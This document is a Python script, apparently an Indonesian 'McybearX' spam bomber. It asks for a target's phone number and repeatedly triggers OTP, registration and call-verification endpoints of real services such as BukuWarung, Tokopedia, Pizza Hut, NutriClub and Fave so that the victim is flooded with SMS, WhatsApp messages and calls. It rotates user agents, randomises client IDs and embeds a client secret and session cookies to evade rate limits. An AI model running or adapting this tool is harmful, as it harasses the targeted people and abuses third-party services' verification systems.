import os,sys,time,requests,json,random,re,sys,bs4,concurrent.futures
from requests import post
from requests import get
from concurrent.futures import ThreadPoolExecutor
Bismillahirohmanirrohim = "Aaammiin"
# KOLOR
m = "\x1b[1;91m"
h = "\x1b[1;92m"
k = "\x1b[1;93m"
b = "\x1b[1;94m"
u = "\x1b[1;95m"
l = "\x1b[1;96m"
p = "\x1b[1;97m"
# McybearX !!!
emil=print
bts=0
usup=input
sistem = os.system
ua = open("._McybearX_.txt","r").readlines()
kantor=requests.Session()
mx = u+"ʕ"+m+" x"+u+"_"+m+"×"+u+"ʔ"
sup = "\x1b[4;95m               \x1b[0;95m/\x1b[3;91mM\x1b[1;95mcybear\x1b[1;91mX\x1b[0;90m"
#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$#
# Alamat Ip
#pipit = requests.get("https://api.ipify.org")
#ip = json.loads(pipit.text)
# Kolor
m = "\x1b[1;91m"
h = "\x1b[1;92m"
k = "\x1b[1;93m"
b = "\x1b[1;94m"
u = "\x1b[1;95m"
l = "\x1b[1;96m"
p = "\x1b[1;97m"
def animasi(McybearX):
	for suport in McybearX + "\n":
		sys.stdout.write(suport)
		sys.stdout.flush()
		time.sleep(1./100)
def klir():
	sistem("clear")
def logo():
    emil("""
\x1b[1;91m     __  ___ \x1b[1;95m                             \x1b[1;91m _  __
\x1b[1;91m    /  |/  /\x1b[1;95m_____ ____   ____ _ ____ ___  \x1b[1;91m| |/ /
\x1b[1;91m   / /|_/ /\x1b[1;95m/ ___// __ \ / __ `// __ `__ \ \x1b[1;91m|   / 
\x1b[1;91m  / /  / /\x1b[1;97m(__  )/ /_/ // /_/ // / / / / /\x1b[1;91m/   |  
\x1b[1;91m /_/  /_/\x1b[1;97m/____// .___/ \__,_//_/ /_/ /_/\x1b[1;91m/_/|_|  
\x1b[1;91m         \x1b[1;97m     /_/                                  """)
def menu():
	global nohap,link,koin,tot
	klir()
	logo()
	emil(u+" ["+m+"!"+u+"] "+k+"INFO    "+p+": Emil Sayang Usup :v")
	emil(u+" ["+m+"×"+u+"] "+p+"Author  : "+m+"M"+u+"cybear"+m+"X")
	emil(u+" ["+m+"×"+u+"] "+m+"Youtube "+p+": MBEWLEGS")
	emil(u+" ["+m+"×"+u+"] "+p+"Github  :"+b+" https://github.com/McybearX "+u+"/")
#	emil(u+" ["+m+"×"+u+"] "+p+"IP Kamu : "+b+ip)
	emil("\x1b[1;95m￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣\x1b[0;00m")
	emil(u+" ["+m+"o1"+u+"]"+p+" Spam Sms "+b+"("+p+"BukuWarung"+b+")")
	emil(u+" ["+m+"o2"+u+"]"+p+" Spam Call "+b+"("+p+"BTS"+b+")")
	emil(u+" ["+m+"o3"+u+"]"+p+" Spam Wa "+b+"("+p+"tokped"+b+")")
	emil(u+" ["+m+"o4"+u+"]"+p+" Spam Brutal "+b+"("+p+"sms"+b+"+"+p+"wa"+b+"+"+p+"call"+b+")")
	emil(sup)
	puput = usup(mx+p+" No : "+m)
	if puput=="1" or puput=="01":
		nohap = usup(mx+p+" Nomor Target : +62")
		metod = "SMS"
		buku_warung(metod)
	elif puput=="2" or puput=="02":
		nohap = usup(mx+p+" Nomor Target : +62")
		spam_call()
	elif puput=="3" or puput=="03":
		nohap = usup(mx+p+" Nomor Target : +62")
		tokped()
	elif puput=="4" or puput=="04":
		nohap = usup(mx+p+" Nomor Target : +62")
		brutal()
	else:
		animasi(mx+p+" Pilihan "+m+puput+p+" Gada Di Menu Tod!!!")
		time.sleep(3)
		menu()
def spam_call():
	Emil = int(usup(mx+p+" Jumlah Spam : "))
	emil(u+" ["+k+"!"+u+"]"+k+" Limit 30 detik")
	for kepin in range(Emil):
		call_bts()
		cunuy()
		time.sleep(10)
def brutal():
	Emil = int(usup(mx+p+" Jumlah Spam : "))
	for love in range(Emil):
		buku_warung_sms()
		tokped()
		call_bts()
		cunuy()
		buku_warung_wa()
		nutriclub()
		piza()
		fav()
		time.sleep(15)
def buku_warung_wa():
	metod = "WA"
	buku_warung(metod)
def buku_warung_sms():
	metod = "SMS"
	buku_warung(metod)
def buku_warung(metod):
	uhah = random.choice(ua).replace("\n","")
	palalo = {"Host": "api-v2.bukuwarung.com","Connection": "keep-alive","Content-Length": "194","sec-ch-ua-mobile": "?1","x-app-version-name": "3.7.2","User-Agent": uhah,"Content-type": "application/json; charset=utf-8","Access-Control-Allow-Origin": "*","accept": "*/*","x-app-version-code": "3300","Origin": "https://app.bukuwarung.com","Sec-Fetch-Site": "same-site","Sec-Fetch-Mode": "cors","Sec-Fetch-Dest": "empty","Referer": "https://app.bukuwarung.com/","Accept-Encoding": "gzip, deflate, br","Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
	samson = {"action":"LOGIN_OTP","countryCode":"+62","deviceId":"","phone":nohap,"method":metod,"clientId":"d504e926-aca8-41ca-ab37-68fe44067e7b","clientSecret":"I7ueetTSL4K1lYioaWlqPyd5I0t7RmBF"}
	url = "https://api-v2.bukuwarung.com:443/api/v2/auth/otp/send"
	rek = requests.post(url,headers=palalo,json=samson)
	haha = json.loads(rek.text)["status"]
	if "OTP_SENT" in haha:
		emil(u+" ["+h+"x"+u+"]"+p+" BukuWarung "+metod+" Sukses")
	else:
		emil(u+" ["+m+"x"+u+"]"+k+" BukuWarung Limit...")
def tokped():
         uhah = random.choice(ua).replace("\n","")
         no = ("0"+nohap)
         palalo = {'User-Agent' : uhah,'Accept-Encoding' : 'gzip, deflate','Connection' : 'keep-alive','Origin' : 'https://accounts.tokopedia.com','Accept' : 'application/json, text/javascript, */*; q=0.01','X-Requested-With' : 'XMLHttpRequest','Content-Type' : 'application/x-www-form-urlencoded; charset=UTF-8'}
         regist = requests.get('https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn='+no+'&ld=https%3A%2F%2Faccounts.tokopedia.com%2Fregister%3Ftype%3Dphone%26phone%3D{}%26status%3DeyJrIjp0cnVlLCJtIjp0cnVlLCJzIjpmYWxzZSwiYm90IjpmYWxzZSwiZ2MiOmZhbHNlfQ%253D%253D', headers = palalo).text
         _mbew_ = re.search(r'\<input\ id=\"Token\"\ value=\"(.*?)\"\ type\=\"hidden\"\>', regist).group(1)
         dita = {"otp_type" : "116","msisdn" : no,"tk" : _mbew_,"email" : '',"original_param" : "","user_id" : "","signature" : "","number_otp_digit" : "6"}
         rek = requests.post('https://accounts.tokopedia.com/otp/c/ajax/request-sms', headers = palalo, data = dita).text
         dela = json.loads(rek)
         if "Maaf, Permohonan Anda tidak dapat diproses saat ini. Mohon dicoba kembali." in dela['error_message']:
                  emil(u+" ["+m+"x"+u+"]"+k+" Tokped Limiit...")
         elif "Anda sudah melakukan 3 kali pengiriman kode" in dela["error_message"]:
                  emil(u+" ["+m+"x"+u+"]"+k+" Tokped Limit...")
         elif " " in dela['error_message']:
                  emil(dela)
                  emil(u+" ["+h+"x"+u+"]"+p+" Tokped Sukses")
         else:
                  emil(u+" ["+h+"x"+u+"]"+p+" tokped Suksess")

def call_bts():
	uhah = random.choice(ua).replace("\n","")
	palalo = {
	"Host": "id.jagreward.com",
	"Connection": "keep-alive",
	"Accept": "*/*",
	"X-Requested-With": "XMLHttpRequest",
	"sec-ch-ua-mobile": "?1",
	"User-Agent": uhah,
	"Sec-Fetch-Site": "same-origin",
	"Sec-Fetch-Mode": "cors",
	"Sec-Fetch-Dest": "empty",
	"Referer": "https://id.jagreward.com/member/register/",
	"Accept-Encoding": "gzip, deflate, br",
	"Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
	'Cookie': 'PHPSESSID=kvo0um7je1ignbnod57013fbqb; DAPROPS="sjs.webGlRenderer:Mali-G52|bjs.accessDom:1|bcookieSupport:1|bcss.animations:1|bcss.columns:1|bcss.transforms:1|bcss.transitions:1|sdevicePixelRatio:2.700000047683716|idisplayColorDepth:24|bflashCapable:0|bhtml.audio:1|bhtml.canvas:1|bhtml.inlinesvg:1|bhtml.svg:1|bhtml.video:1|bjs.applicationCache:0|bjs.deviceMotion:1|bjs.deviceOrientation:0|bjs.geoLocation:1|bjs.indexedDB:1|bjs.json:1|bjs.localStorage:1|bjs.modifyCss:1|bjs.modifyDom:1|bjs.querySelector:1|bjs.sessionStorage:1|bjs.supportBasicJavaScript:1|bjs.supportConsoleLog:1|bjs.supportEventListener:1|bjs.supportEvents:1|bjs.touchEvents:1|bjs.webGl:1|bjs.webSockets:1|bjs.webSqlDatabase:1|bjs.webWorkers:1|bjs.xhr:1|iorientation:0|buserMedia:1|bjs.battery:0"; _ga=GA1.3.415155992.1641991248; _gid=GA1.3.444351545.1641991248; _gat=1'
	}
	link = "https://id.jagreward.com/member/verify-mobile/"+nohap
	_emiil_ = requests.get(link,headers=palalo)
	_usupp_ = json.loads(_emiil_.text)
	res = _usupp_["result"]
	pon = _usupp_["message"]
	if "Anda akan menerima sebuah panggilan dari sistem kami. Silakan isi 6 ANGKA TERAKHIR dari nomor telepon dibawah ini." in pon:
		emil(u+" ["+h+"x"+u+"]"+p+" Call Bts Sukses")
	else:
		emil(u+" ["+m+"x"+u+"]"+k+" Call Bts Limit...")
def cunuy():
	req=requests.get("https://ainxbot-sms.herokuapp.com/api/spamsms",params={"phone":nohap}).text
	if "terkirim" in req:
		emil(u+" ["+h+"x"+u+"]"+p+" Bonus BOM Sms Terkirim");time.sleep(3)
		emil(u+" ["+h+"x"+u+"]"+p+" + 2× Call Greater Jakarta")
	elif "Internal Server Error" in req:
		emil(u+"["+m+"x"+u+"]"+k+" Limit...")
	else:
		emil(req)
		emil(u+"["+m+"x"+u+"]"+k+" Eror...")
def nutriclub():
	nom="0"+nohap
	rek=requests.post('https://www.nutriclub.co.id/otp/?phone='+nom+'&old_phone='+nom)
	ruk=json.loads(rek.text)["StatusCode"]
	if 'Kode OTP berhasil dikirim' in ruk:
		emil(u+" ["+h+"x"+u+"]"+p+" NutriClub Sukses")
	elif "30" in ruk:
		emil(u+" ["+m+"x"+u+"]"+p+" NutriClub limit...")
	else:
		emil("nutriklub ",ruk)
def piza():
	uhah = random.choice(ua).replace("\n","")
	ijat="a","b","c","d","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z"
	sat = random.choice(ijat)
	palalo={
	"Host": "api-prod.pizzahut.co.id",
	"Connection": "keep-alive",
	"Content-Length": f"{random.randint(150,170)}",
#	"Content-Length": "167",
#	"X-DEVICE-TYPE": "PC",
	"sec-ch-ua-mobile": "?1",
	"x-platform": "WEBMOBILE",
	"X-CHANNEL": "2",
	"Content-Type": "application/json;charset=UTF-8",
	"Accept": "application/json",
	"X-CLIENT-ID": f"{sat}{random.randint(10000,40000)}{sat}{random.randint(0,9)}-435b-4f41-80e9-163eef20e0ab",
#	"X-CLIENT-ID": "b39773b0-435b-4f41-80e9-163eef20e0ab",
	"User-Agent": uhah,
	"X-LANG": "en",
	"X-DEVICE-ID": "web",
	"Origin": "https://www.pizzahut.co.id",
	"Sec-Fetch-Site": "same-site",
	"Sec-Fetch-Mode": "cors",
	"Sec-Fetch-Dest": "empty",
	"Referer": "https://www.pizzahut.co.id/",
	"Accept-Encoding": "gzip, deflate",
	"Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
	}
	dat={
	"email": "KamuKenaPrank123@gmail.com",
	"first_name":"SUBSCRIBE",
	"gender":2,
	"last_name":"YtMbewLegs",
	"password": "Pasipuripasipapa_321",
	"phone":nohap,
	"birthday": "2006-03-12"
	}
	cup = kantor.post("https://api-prod.pizzahut.co.id:443/customer/v1/customer/register",headers=palalo,json=dat).text
	if "You have reached max. of 3 OTPs for today. Please contact Customer Service support on 1500600 to help you forward" in cup:
		emil(u+" ["+m+"x"+u+"]"+k+" PizzaHut Limit...")
	elif "Successful" in cup:
		emil(u+" ["+h+"x"+u+"]"+p+" PizzaHut Sukses")
	else:
		emil(cup)

def adakami():
	uhah=random.choice(ua).replace("\n","")
	hd = {
	"content-type": "application/json; charset=UTF-8",
	"content-length": "34",
	"accept-encoding": "gzip",
#	"user-agent": "okhttp/3.8.0",
	"user-agent": uhah,
	"accept-language": "in",
	"x-ada-token": "",
	"x-ada-appid": "800006",
	"x-ada-os": "android",
	"x-ada-channel": "default",
	"x-ada-mediasource": "",
	"x-ada-agency": "adtubeagency",
	"x-ada-campaign": "AdakamiCampaign",
	"x-ada-role": "1",
	"x-ada-appversion": "1.7.0",
	"x-ada-device": "",
	"x-ada-model": "SM-G935FD",
	"x-ada-os-ver": "7.1.1",
	"x-ada-androidid": "a4341a2sa90a4d97",
	"x-ada-aid": "b7bbb23d-a220-4d43-9caf-153608f9bd39",
	"x-ada-afid": "1580054114839-7395423911531673296"
	}
	dat = {"ketik":0,"nomor":"0"+nohap}
	datjson = json.dumps(dat)
	a = kantor.post("https://api.adakami.id/adaKredit/pesan/kodeVerifikasi",data=datjson,headers=hd,timeout=10).text
	emil(a)
def fav():
	uhah=random.choice(ua).replace("\n","")
	hd = {"Host": "api.myfave.com","Connection": "keep-alive","x-user-agent": "Fave-PWA/v1.0.0","User-Agent": uhah,"content-type": "application/json","Accept": "*/*","Origin": "https://m.myfave.com","Referer": "https://m.myfave.com/jakarta/auth","Accept-Encoding": "gzip, deflate, br","Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
	dat = {'phone':'62'+nohap}
	x = kantor.post("https://api.myfave.com/api/fave/v3/auth", data=json.dumps(dat), headers=hd).text
	emil(x)
########
def depop():
	hd = {'Host':'webapi.depop.com','content-length':'49','accept':'application/json, text/plain, */*',
'origin':'https://signup.depop.com',
'save-data':'on',
'user-agent':'Mozilla/5.0 (Linux; Android 9; vivo 1902) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36',
'content-type':'application/json'}
	dat = {'phone_number':nohap,'country_code':'ID'}
	datjs = json.dumps(dat)
	polisi = kantor.put("https://webapi.depop.com/api/auth/v1/verify/phone",headers=hd,data=datjs).text
	emil(polisi)
if Bismillahirohmanirrohim == "Aaammiin":
	menu()
